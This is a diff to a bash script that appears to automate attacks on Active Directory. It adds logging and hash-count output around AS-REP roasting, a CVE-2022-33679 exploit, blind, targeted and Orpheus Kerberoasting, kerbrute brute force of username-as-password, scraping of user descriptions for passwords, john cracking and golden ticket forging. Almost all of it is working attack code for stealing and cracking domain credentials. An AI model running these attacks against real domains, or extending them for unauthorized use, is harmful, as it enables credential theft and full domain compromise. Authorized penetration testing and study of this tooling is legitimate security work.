@@ -133,6 +133,7 @@ aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
 soapy=$(which soapy)
 nmap=$(which nmap)
 john=$(which john)
+if [ ! -f "${john}" ]; then john="/root/tools/john/run/john"; fi
 python3="${scripts_dir}/.venv/bin/python3"
 if [ ! -f "${python3}" ]; then python3=$(which python3); fi
 
@@ -294,6 +295,10 @@ set -- "${args[@]}"
 
 run_command() {
     echo "$(date +%Y-%m-%d\ %H:%M:%S); $*" >>"$command_log"
+    if [ "$verbose_bool" == true ]; then
+        echo -e "${CYAN}[i] Running command: $*${NC}"
+    fi
+    echo -e "${CYAN}[i] Running command: $*${NC}"
     /usr/bin/script -qc "$@" /dev/null
 }
 
@@ -1158,7 +1163,7 @@ ne_ldap_enum() {
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
-    grep -i "pass\|pwd" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
+    grep -i "pass\|pwd\|passwd\|password\|pswd\|pword" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
     fi
@@ -2074,8 +2079,10 @@ userpass_kerbrute_check() {
         echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
         /bin/rm "${user_pass_wordlist}" 2>/dev/null
         while IFS= read -r i; do
-            echo -e "${i}:${i}" >>"${user_pass_wordlist}"
-        done <"${target_userslist}"
+            # Remove any carriage returns and ensure clean formatting
+            clean_user=$(echo "${i}" | tr -d '\r')
+            echo "${clean_user}:${clean_user}" >> "${user_pass_wordlist}"
+        done < "${target_userslist}"
         sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
         run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt"
         grep "VALID" "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt"
@@ -2219,19 +2226,23 @@ asrep_attack() {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                 users_scan_list=${user_wordlist}
             fi
+            echo -e "${CYAN}[i] Running command: ${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}${NC}"
             run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"
-            grep "krb5asrep" "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" >"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" 2>&1
         else
+            echo -e "${CYAN}[i] Running command: ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}${NC}"
             run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
+            echo -e "${CYAN}[i] Running command: ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}${NC}"
             run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"
-            #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" 2>&1
         fi
+
         if grep -q 'error' "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
         else
             grep "krb5asrep" "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" | tee "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" 2>&1
             if [ -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
+                hash_count=$(wc -l < "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt")
                 echo -e "${GREEN}[+] ASREP-roastable accounts found!${NC}"
+                echo -e "${GREEN}[+] Found ${hash_count} hashes. Saved to ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt${NC}"
             else
                 echo -e "${PURPLE}[-] No ASREP-roastable accounts found${NC}"
             fi
@@ -2247,14 +2258,26 @@ asreprc4_attack() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
             if [ ! -f "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
+                echo -e "${YELLOW}[i] ASREPRoast hashes not found. Initiating ASREP attack...${NC}"
                 asrep_attack
             fi
             asrep_user=$(cut -d "@" -f 1 "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
+                echo -e "${GREEN}[+] ASREProastable user found: ${asrep_user}${NC}"
                 current_dir=$(pwd)
                 cd "${output_dir}/Credentials" || exit
+                echo -e "${YELLOW}[i] Running command: ${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}${NC}"
                 run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee "${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
+                if [ -s "${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt" ]; then
+                    echo -e "${GREEN}[+] Exploit output saved to: ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt${NC}"
+                    hash_count=$(grep -c "krb5asrep" "${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt")
+                    echo -e "${GREEN}[+] Found ${hash_count} hashes.${NC}"
+                    grep "krb5asrep" "${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" | tee "${output_dir}/Kerberos/CVE-2022-33679_hashes_${dc_domain}.txt"
+                    echo -e "${GREEN}[+] Hashes saved to: ${output_dir}/Kerberos/CVE-2022-33679_hashes_${dc_domain}.txt${NC}"
+                else
+                    echo -e "${RED}[-] No hashes found in the exploit output.${NC}"
+                fi
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
             fi
@@ -2273,24 +2296,35 @@ kerberoast_attack() {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(cut -d "@" -f 1 "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
+                echo -e "${YELLOW}[i] Running command: ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}${NC}"
                 run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt"
                 if grep -q 'error' "${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt"; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
+                    echo -e "${GREEN}[+] Blind Kerberoast Attack completed successfully. Extracting hashes...${NC}"
                     grep "krb5tgs" "${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt" | sed "s/\$krb5tgs\$/:\$krb5tgs\$/" | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
+                    hash_count=$(wc -l < "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt")
+                    echo -e "${GREEN}[+] Found ${hash_count} Kerberoast hashes.${NC}"
+                    cat "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
                 fi
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
+            echo -e "${YELLOW}[i] Running command: ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}${NC}"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt"
+            echo -e "${YELLOW}[i] Running command: ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}${NC}"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt"
             #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt" 2>&1
             if grep -q 'error' "${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
             else
+                echo -e "${GREEN}[+] Kerberoast Attack completed successfully. Extracting hashes...${NC}"
                 grep "krb5tgs" "${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt" | sed "s/\$krb5tgs\$/:\$krb5tgs\$/" | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' >"${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
+                hash_count=$(wc -l < "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt")
+                echo -e "${GREEN}[+] Found ${hash_count} Kerberoast hashes.${NC}"
+                cat "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt"
                 grep "MSSQLSvc" "${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt" | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_kerberoast_${dc_domain}.txt"
             fi
         fi
@@ -2322,12 +2356,25 @@ kerborpheus_attack() {
             echo -e "${BLUE}[*] Kerberoast Attack using Orpheus${NC}"
             current_dir=$(pwd)
             cd "${scripts_dir}/orpheus-main" || exit
+            echo -e "${YELLOW}[i] Changing directory to ${scripts_dir}/orpheus-main${NC}"
+            echo -e "${YELLOW}[i] Running command: ${python3} ${orpheus}${NC}"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" >>"$command_log"
             (
                 echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                 cat /dev/tty
             ) | /usr/bin/script -qc "${python3} ${orpheus}" /dev/null | tee -a "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
+            echo -e "${YELLOW}[i] Returning to directory ${current_dir}${NC}"
+            
+            if grep -q "krb5tgs" "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt"; then
+                echo -e "${GREEN}[+] Hashes found during Orpheus Kerberoast Attack. Extracting hashes...${NC}"
+                grep "krb5tgs" "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" | sed "s/\$krb5tgs\$/:\$krb5tgs\$/" | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' >"${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt"
+                hash_count=$(wc -l < "${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt")
+                echo -e "${GREEN}[+] Found ${hash_count} Kerberoast hashes. Saved to ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt${NC}"
+                cat "${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt"
+            else
+                echo -e "${RED}[-] No hashes found during Orpheus Kerberoast Attack.${NC}"
+            fi
         fi
     fi
     echo -e ""
@@ -2408,6 +2455,7 @@ john_crack_kerberoast() {
         if [ ! -s "${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt" ] && [ ! -s "${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
             echo -e "${PURPLE}[-] No SPN accounts found${NC}"
         else
+            echo -e "${GREEN}[+] Hashes location: ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt${NC}"
             echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
             echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
             echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
@@ -2990,7 +3038,17 @@ targetedkerberoast_attack() {
         else
             echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt"
+            command="${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt"
+            echo -e "${GREEN}[+] Running command: ${command}${NC}"
+            run_command "${command}" 2>&1 | tee "${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt"
+            
+            if [ -s "${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
+                hash_count=$(wc -l < "${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt")
+                echo -e "${GREEN}[+] Found ${hash_count} hashes. Saved to: ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt${NC}"
+                cat "${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt"
+            else
+                echo -e "${YELLOW}[-] No hashes found.${NC}"
+            fi
         fi
     fi
     echo -e ""
@@ -4507,7 +4565,9 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Generating golden ticket...${NC}"
                 current_dir=$(pwd)
                 cd "${output_dir}/Credentials" || exit
+                echo -e "${CYAN}[i] Running command: ${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}${NC}"
                 run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
+                echo -e "${CYAN}[i] Running command: ${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi${NC}"
                 run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
                 /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
                 /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
